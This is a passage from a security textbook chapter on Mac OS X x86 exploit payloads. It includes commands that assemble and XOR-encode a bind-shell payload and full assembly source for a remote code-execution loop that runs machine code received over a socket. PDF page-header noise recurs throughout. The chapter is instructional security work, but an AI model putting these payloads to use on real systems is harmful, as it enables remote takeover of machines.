In the previous section we demonstrated how to use test_component to run
a single component. You can also use it to test composite payloads, concat-
enating the source components and then running the composite payload with
test_component.
% cat tcp_listen.bin dup2_std_fds.bin execve_binsh.bin > bindshell.bin
% test_component bindshell.bin
…
You can use a similar approach to test encoded payloads. To do so, you need
to transform a composite payload with the encode_longxor encoder. Using the
encoder is simple. The fi rst argument is the fi lename containing the raw payload.
Subsequent arguments are byte values that should be avoided in the encoded
9955336633cc0099..iinndddd 223377 11//2255//0099 44::4422::2288 PPMM
238 Part III ■ Exploitation
output. The encoder prints out the 32-bit LongXOR key value that was used to
encode the payload. The encoded payload is stored in a fi le named by append-
ing .xor to the input fi lename.
Now that you have a raw payload in payload.bin, you can encode it with the
following command.
% longxor_encoder execve_binsh.bin 0x00 0xff 0x09 0x0a 0x0b 0x0c
0x0d 0x20
0x01010304
The following command assembles the decoder, defi ning the constants for
the XOR key and payload size.
% stat –f %z execve_binsh.bin.xor
52
% cc –c –DKEY=0x01010304 –DSIZE=52 decode_longxor.s
Finally, you can append the decoder stub and the encoded payload.
% o2bin.pl decode_longxor.o decode_longxor.bin
% cat decode_longxor.bin execve_binsh.bin.xor > decode_longxor-
execve_binsh.bin
You now have a self-decoding version of the execve_binsh payload. You can
test the entire payload by using the test_component utility:
% test_component decode_longxor-execve_binsh.bin
==> Read 132 bytes, executing component…
sh-3.2$ exit
exit
Intel x86 Exploit Payloads
There are two common syntaxes for x86 assembly language: AT&T and Intel.
The GNU assembler, like most other GNU tools, uses AT&T syntax, which
can be quite confusing, especially to a beginner assembly programmer. For
that reason and because we prefer Intel syntax, we will describe the Netwide
Assembler (NASM), which is also included with Mac OS X.
Intel x86 has a very complex instruction set and explaining it fully is well
beyond the scope of this book. For a great introduction to and an in-depth
explanation of the x86 assembly, consult The Art of Assembly Language (No Starch,
2003). For the payloads in this chapter, we aim only to be moderately tricky, not
so clever that it is not clear what we are doing. We will explain adequate use of
x86 tricks to optimize the code for size and encoding byte values.
9955336633cc0099..iinndddd 223388 11//2255//0099 44::4422::2288 PPMM
Chapter 9 ■ Exploit Payloads 239
The x86 architecture is a stack-oriented complex instruction set computer
(CISC) architecture. There is a limited number of registers, and most code will
make heavy use of the stack for temporary storage. Table 9-2 summarizes the
available user registers and how they are often used. While many instructions
implicitly use specifi c registers, all except the stack-pointer (ESP) register may
be used as general-purpose registers depending on the software conventions
in use.
Table 9-2: x86 Registers
REGISTER DESCRIPTION
EAX Accumulator register; general-purpose
EBX Base register; used by position-independent code
ECX Count register; object pointer; general-purpose
EDX Data register; general-purpose
ESI Source register for string instructions
EDI Destination register for string instructions
EBP Stack frame base pointer
ESP Stack register
Instruction operands may specify immediate values, registers, or indirect
memory references. The indirect memory references may specify offsets and even
scaling of offsets relative to a base address contained in a register. Most instruc-
tions can take two register operands or one register and one memory operand.
Table 9-3 lists some common x86 instructions and how they are used.
Table 9-3: Common x86 Instructions
INSTRUCTION FORMAT DESCRIPTION
mov mov dest, src Moves source reg/mem to destreg/mem
add add dest, src Adds src to dest and stores result in dest
sub sub dest, src Subtracts src from dest, store result
in dest
dec dec dest Decrements destination
inc inc dest Increments destination
cmp cmp dest, src Subtracts src from dest, but does not
store
mul mull src Multiplies accumulator (EAX) by src
Continued
9955336633cc0099..iinndddd 223399 11//2255//0099 44::4422::2299 PPMM
240 Part III ■ Exploitation
Table 9-3 (continued)
INSTRUCTION FORMAT DESCRIPTION
imul imul src Signed multiply into accumulator or dest
imul src, immed
imul dest, src, immed
imul dest, src
xor xor dest, src Exclusive OR
push push src Pushes src reg/mem onto stack
pop pop dst Pops value from stack into reg/mem
pusha pusha Pushes all user registers onto stack
popa popa Pops all user registers from stack
ja/jb ja/jb label Jumps if above or below (unsigned)
jl/jg jl/jg label Jumps if less than or greater than
(signed)
jmp jmp label Unconditional jump
call call label Pushes return address, calls function
ret ret imm Returns from subroutine, adjusts stack
pointer
cld cld Clears direction fl ags
lodsb lodsb Loads string byte into accumulator
lodsd lodsd Loads string dword into accumulator
ror ror dest, immed Rotates dest register by immed bits
int int imm Issues interrupt
There are multiple common ways to execute a system call on x86, including
through an interrupt, a call gate, and the sysenter instruction. Mac OS X sup-
ports system calls through both interrupt 0x80 and the sysenter instruction.
The int 0x80 method is more compact, and that is what you will use here. The
following code shows how to execute a single system call. The arguments to
the system call are pushed onto the stack in reverse order, just as if you were
calling a function. The system call handler expects there to be four bytes of
space on the stack before the arguments, so you push an extra “dummy” argu-
ment onto the stack as the fi rst argument. You issue the system call by placing
the desired system call number in the EAX register and executing the int 0x80
instruction. Finally, you must adjust the stack pointer to pop the arguments
off of the stack.
BITS 32
9955336633cc0099..iinndddd 224400 11//2255//0099 44::4422::2299 PPMM
Chapter 9 ■ Exploit Payloads 241
GLOBAL _main
_main:
push dword 13 ; exit status = 13
push dword 0 ; padding
mov eax, 1 ; SYS_exit
int 0x80
add esp, 8
ret
For the discussion on Intel x86 payloads, rather than show the same func-
tionality written for another architecture, we are going to skip over the simpler
payload components and begin with new, more advanced functionality. At the
system call level, Mac OS X x86 is almost identical to FreeBSD (and the other x86
BSD operating systems). The system call numbers, arguments, and semantics
are all the same. Therefore, we will not discuss the simpler payloads on x86 here,
as they are discussed many times over in other books and in materials online.
For a good discussion on x86 BSD exploit payloads and shellcode, consult The
Shellcoder’s Handbook. We will center our discussion of x86 payloads on two
higher-level exploit payload components: a remote code-execution server and
remote Mach-O bundle injection.
remote_execution_loop
The fi rst Intel x86 payload component will be a remote code execution server.
This component is intended to be run after a socket-establishment component
(tcp_connect, tcp_listen, or tcp_fi nd) and is written as a function taking that
socket as its singular argument. This conceptually simple component frees you
from size and byte-value constraints in the payloads and gives you complete
fl exibility in subsequent stages. The executed fragment is given control of the
socket, so it may read and write additional data using it or establish additional
connections. Later in this chapter we will show a complex fragment designed
to be executed through this server that downloads and injects a Mach-O bundle
into the process.
The client-server protocol for using this component is very simple. First the
client (the attacker) sends a 4-byte host-order integer specifying the size of the
machine-code fragment that will be sent. The server receives this size and uses
the mmap() system call to allocate at least that much executable memory directly
from the operating system. The client then sends the machine-code fragment.
The server reads this into the mmap()’d memory buffer and executes it. The
server assumes that machine-code fragments will be written as functions taking
a single argument (the socket) and returning an integer value. The fragment
must be careful to preserve the ESP and EBP registers when it returns control to
9955336633cc0099..iinndddd 224411 11//2255//0099 44::4422::2299 PPMM
242 Part III ■ Exploitation
the server loop. The server fi nally sends back to the client the value returned by
the executed fragment. At this point both client and server loop in this fashion
until the client sends a zero for a fragment size, at which point both the client
and the server terminate the loop.
;;;
;;; remote_execution_loop - A remote machine code execution loop
;;;
BITS 32
GLOBAL _remote_execution_loop
;;; --------------------------------------------------------------------
;;; remote_execution_loop(int fd)
;;;
;;; A remote machine code execution loop.
;;;
;;; Arguments:
;;; fd - File descriptor to read code from and write status to
;;; --------------------------------------------------------------------
_remote_execution_loop:
push ebp
mov ebp, esp
sub esp, byte 12
mov esi, [ebp+8] ; socket
.read_eval_write:
xor ecx, ecx ; clear ecx
mul ecx ; clear eax and edx
;; Read a 4-byte size of code fragment to execute
mov al, 4
push eax ; nbyte
lea edi, [ebp-4]
push edi ; buf
push esi ; s
push eax
dec eax
int 0x80
jb .return
add esp, byte 16
cmp eax, ecx ; A zero-read signals termination
je .return
mov ecx, [ebp-4]
xor eax, eax
cmp ecx, eax
9955336633cc0099..iinndddd 224422 11//2255//0099 44::4422::2299 PPMM
Chapter 9 ■ Exploit Payloads 243
je .return ; A zero value signals termination
;; mmap memory
xor eax, eax
push eax ; 0
dec eax
push eax ; -1
inc eax
mov ax, 0x1002
push eax ; (MAP_ANON | MAP_PRIVATE)
xor eax, eax
mov al, 7
push eax ; (PROT_READ | PROT_WRITE | PROT_EXEC)
push ecx ; len
push edx ; addr
push edx ; spacer
mov al, 197
int 0x80
jb .return ; Terminate on error
add esp, byte 28
mov [ebp-8], eax ; memory buffer
;; read fragment from file descriptor into mmap buffer
mov edi, eax
.read_fragment:
xor eax, eax
push ecx ; nbytes
push edi ; buf
push esi ; s
push eax
mov al, 3
int 0x80
jb .return
add esp, byte 16
add edi, eax ; Add bytes read to buf pointer
sub ecx, eax ; Subtract bytes read from total
jnz .read_fragment
;; Evaluate the buffer as machine code by calling it as a function
;; with the socket as its single argument
pusha ; Save state in case it gets clobbered
push esi
mov eax, [ebp-8]
call eax
mov [ebp-12], eax ; Save returned value
popa ; Restore all registers
;; Unmap memory
xor eax, eax
push dword [ebp-4]
9955336633cc0099..iinndddd 224433 11//2255//0099 44::4422::2299 PPMM
244 Part III ■ Exploitation
push dword [ebp-8]
push eax
mov al, 73
int 0x80
jb .return
add esp, byte 12
;; Write return value to socket
xor eax, eax
mov al, 4 ; SYS_write and nbytes
push eax ; nbytes
lea edi, [ebp-12] ; buf
push edi
push esi ; s
push eax
int 0x80
jb .return
add esp, byte 16
;; Loop until an error or read zero
jmp .read_eval_write
.return
leave
ret
inject_bundle
In all of the previous payloads, we used operating-system functionality by
executing system calls directly because the system call numbers are static, and
we can therefore make the payloads execute independent of the target’s and
the payload’s locations in memory. The system calls provide enough high-level
functionality to communicate over the network and execute programs, but
sometimes it would be nice to use other functionality provided in Mac OS X
libraries and frameworks. To do this, the payload needs to be able to look up
symbols in loaded libraries either by traversing the symbol tables in all loaded
libraries or by resolving only the functions to do this in dyld. Mac OS X sup-
ports the dlopen() runtime linking API that is common in other UNIX-based
operating systems. The API consists of dlopen() to load shared libraries, dlsym()
to resolve symbols within them, and dlclose() to unload libraries that are no
longer needed. This payload component will implement a minimal version of
dlsym() that it uses on dyld to resolve the real versions of these functions. The
macho_resolve() function can be used with any other loaded library; however,
9955336633cc0099..iinndddd 224444 11//2255//0099 44::4422::2299 PPMM
Chapter 9 ■ Exploit Payloads 245
since dyld is always loaded at a constant address in memory, the payload will
usually use macho_resolve() with it.
To demonstrate the resolving algorithm, we must fi rst explain some details
of the Mach-O executable format. A Mach-O (Mach Object) library in memory
is almost identical to its on-disk format. There are only a few differences. When
a Mach-O executable image is loaded into memory, its segments are typically
loaded on page-aligned boundaries, whereas in the fi le the segments take up
only as much space as necessary. Also, a Mach-O library or executable can be
stored in a “fat” (Universal binaries) format, containing copies of the Mach-O
image for multiple architectures. The in-memory version contains just the
Mach-O image for the host machine’s architecture.